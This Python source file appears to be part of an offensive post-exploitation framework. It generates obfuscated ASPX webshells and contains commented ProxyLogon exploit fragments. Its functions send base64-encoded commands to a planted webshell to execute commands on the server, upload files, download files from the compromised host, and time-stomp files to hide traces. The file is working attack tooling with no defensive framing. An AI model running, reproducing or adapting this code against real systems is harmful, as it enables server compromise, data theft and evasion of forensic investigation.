import requests
import base64
import sys
from Crypto import Random
import subprocess
import string
from core.color import bcolors
import os, base64, random, codecs, glob, readline, re

#if len(sys.argv) < 1:
#    print("Usage: python ProxyLogon.py target")
#    exit()
#target = sys.argv[1]
#shellpath=sys.argv[2]
#url = 'https://'+target+':443/ecp/auth/test7.aspx'
#url = 'https://'+target+':443'+shellpath
#url = 'https://'+target+':443/ecp/auth/Errors.aspx'
#myobj = {'t': 'hostname'}

#x = requests.post(url, data = myobj, verify=False)
"""
while(True):
    command = input("Command : ")
    myobj = {'t': command}

    x = requests.post(url, data=myobj, verify=False)
    print("Output : "+x.text.split("Name                            : OAB (Default Web Site)")[0])

"""

#url = 'http://192.168.183.128/iis.aspx'
#myobj = {'t': 'hostname'}
#command = input("Command : ")

#raw_data="MV9ob3N0bmFtZV9jbWRfZTRkNTY4NGUtZTgwODUyMTctYjQyMjkyZTctZDMyZjlmN2Y="

#command execution

def webshell_execute(webshell,command):
    try:
        URL=webshell[1]
        KEY=webshell[2]
        b64command="1_{CMD}_cmd_{KEY}".replace("{CMD}",command).replace("{KEY}",KEY)
        raw_data=base64.b64encode(bytearray(b64command,"UTF-8"))
        #print(raw_data)
        x = requests.post(URL, data = raw_data, verify=False)
        if "r^" in x.text:
            print("Webshell ( "+URL+" ) sent Output : \n"+x.text)
        else:
            #print("Output : "+base64.b64decode(x.text[8:][:-8].strip()).decode("UTF-8"))
            print("Webshell ( "+URL+" ) sent Output : \n"+base64.b64decode(x.text[8:][:-8].strip()).decode("UTF-8"))
    except Exception as e:
        print( '[-] ERROR(webshell_execute): %s' % str(e))

def generate_webshell():
    try:
        f=open("lib/obf.list")
        links=f.read()
        list_full=links.strip().replace("\r","").split("\n")
        fp = open('agents/webshell.ninja', 'r')
        webshell = fp.read()
        KEY="".join([random.choice(string.ascii_uppercase+string.digits) for i in range(8)])+"-"+"".join([random.choice(string.ascii_uppercase+string.digits) for i in range(8)])+"-"+"".join([random.choice(string.ascii_uppercase+string.digits) for i in range(8)])+"-"+"".join([random.choice(string.ascii_uppercase+string.digits) for i in range(8)])
        VAR1=random.choice(list_full)
        list_full.remove(VAR1)
        VAR2=random.choice(list_full)
        list_full.remove(VAR2)
        VAR3=random.choice(list_full)
        list_full.remove(VAR3)
        VAR4=random.choice(list_full)
        webshell = webshell.replace('{KEY}', KEY).replace('{VAR1}', VAR1).replace('{VAR2}', VAR2).replace('{VAR3}', VAR3).replace('{VAR4}', VAR4)
        payload= open('payloads/webshell_'+KEY+'.aspx', 'w')
        payload.write(webshell)
        payload.close()
        print("Webshell Generate with key ( "+KEY+" ) and writen in "+'payloads/webshell_'+KEY+'.aspx'+" : \n"+bcolors.FAIL + webshell+ bcolors.ENDC )
        return webshell
    except:
        print("Error Generating Webshell ")


def upload_file(webshell,args):
    #webshell,filename,dest_path
    try:
        if len(args)<3:
            print("Usage : upload <filename ; file must be in file folder> <destination path including new file name>")
        #filename = "shell.aspx"#input("File name to upload : ")
        #path= input("path on the server : ")
        #path="C:\\windows\\temp\\"#"C:\\inetpub\\wwwroot\\aspnet_client\\"
        URL=webshell[1]
        KEY=webshell[2]
        filename=args[1]
        dest_path=args[2]
        b64command="2_{filename}_{content}_{KEY}"
        p=open("file/"+filename,"rb")
        content=base64.b64encode(p.read())
        p.close()
        raw_data=base64.b64encode(bytearray(b64command.replace("{filename}",dest_path).replace("{content}",content.decode("utf-8")).replace("{KEY}",KEY),"UTF-8"))
        #print(raw_data)
        x = requests.post(URL, data = raw_data, verify=False)
        if "r^" in x.text:
            print("Webshell ( "+URL+" ) sent Output : \n"+x.text)
        elif base64.b64decode(x.text[8:][:-8].strip()).decode("UTF-8").strip()=="_":
            print("Webshell ( "+URL+" ) Sucessfully uploaded the file")
            print("Webshell ( "+URL+" ) sent Output : \n"+base64.b64decode(x.text[8:][:-8].strip()).decode("UTF-8"))
        #print(x.text)
    except Exception as e:
        print( '[-] Error Uploading the file through webshell ( %s ) with error message ( %s )' % (URL,str(e)))

        #print("Error Uploading the file through webshell : "+URL)


def download_file(webshell,args):
    #webshell,filename,dest_path
    try:
        if len(args)<2:
            print("Usage : download <File path>")
        #filename = "shell.aspx"#input("File name to upload : ")
        #path= input("path on the server : ")
        #path="C:\\windows\\temp\\"#"C:\\inetpub\\wwwroot\\aspnet_client\\"
        URL=webshell[1]
        KEY=webshell[2]
        filename=args[1]
        b64command="3_{filename}_None_{KEY}"
        #p=open("file/"+filename,"rb")
        #content=base64.b64encode(p.read())
        #p.close()
        raw_data=base64.b64encode(bytearray(b64command.replace("{filename}",filename).replace("{KEY}",KEY),"UTF-8"))
        #print(raw_data)
        x = requests.post(URL, data = raw_data, verify=False)
        if "r^" in x.text:
            print("Webshell ( "+URL+" ) sent Output : \n"+x.text)
        else:
            #print("Webshell ( "+URL+" ) Sucessfully downloaded the file")
            print("Webshell ( "+URL+" ) sucessfully downloaded the file")#sent Output : \n"+base64.b64decode(x.text[8:][:-8].strip()).decode("UTF-8"))
            p=open("downloads/"+re.findall(r'[^\/\\]+(?=$)',filename)[0],"wb")
            p.write(base64.b64decode(base64.b64decode(x.text[8:][:-8].strip())))
            p.close()
        #print(x.text)
    except Exception as e:
        print( '[-] Error downloading the file through webshell ( %s ) with error message ( %s )' % (URL,str(e)))



def time_stomp(webshell,args):
    #webshell,filename,dest_path
    try:
        if len(args)<3:
            print("Usage : time_stomp <path of the file you want to have same ( access , modify , creation ) date > < destination file to edit its date >")
        URL=webshell[1]
        KEY=webshell[2]
        src_path=args[1]
        dest_path=args[2]
        b64command="4_{source_filename}_{destination_filename}_{KEY}"
        raw_data=base64.b64encode(bytearray(b64command.replace("{source_filename}",src_path).replace("{destination_filename}",dest_path).replace("{KEY}",KEY),"UTF-8"))
        #print(raw_data)
        x = requests.post(URL, data = raw_data, verify=False)
        if "r^" in x.text:
            print("\nWebshell ( "+URL+" ) sent Output : \n"+x.text)
        elif base64.b64decode(x.text[8:][:-8].strip()).decode("UTF-8").strip()=="_":
            print("\nWebshell ( "+URL+" ) Sucessfully time stomped the file ( "+dest_path+" )")
            #print("Webshell ( "+URL+" ) sent Output : \n"+base64.b64decode(x.text[8:][:-8].strip()).decode("UTF-8"))
        #print(x.text)
    except Exception as e:
        print( '[-] Error Uploading the file through webshell ( %s ) with error message ( %s )' % (URL,str(e)))



"""
src_filename = "C:\\inetpub\\wwwroot\\Entry.aspx"
dest_filename="C:\\inetpub\\wwwroot\\iis.aspx"
#path= input("path on the server : ")
#path="C:\\windows\\temp\\"#"C:\\inetpub\\wwwroot\\aspnet_client\\"
b64command="4_{source_filename}_{destination_filename}_e4d5684e-e8085217-b42292e7-d32f9f7f"

raw_data=base64.b64encode(bytearray(b64command.replace("{source_filename}",src_filename).replace("{destination_filename}",dest_filename),"UTF-8"))
print(raw_data)
x = requests.post(url, data = raw_data, verify=False)
if "r^" in x.text:
    print(x.text)
else:
    print("Output : "+base64.b64decode(x.text[8:][:-8].strip()).decode("UTF-8"))
print(x.text)
"""
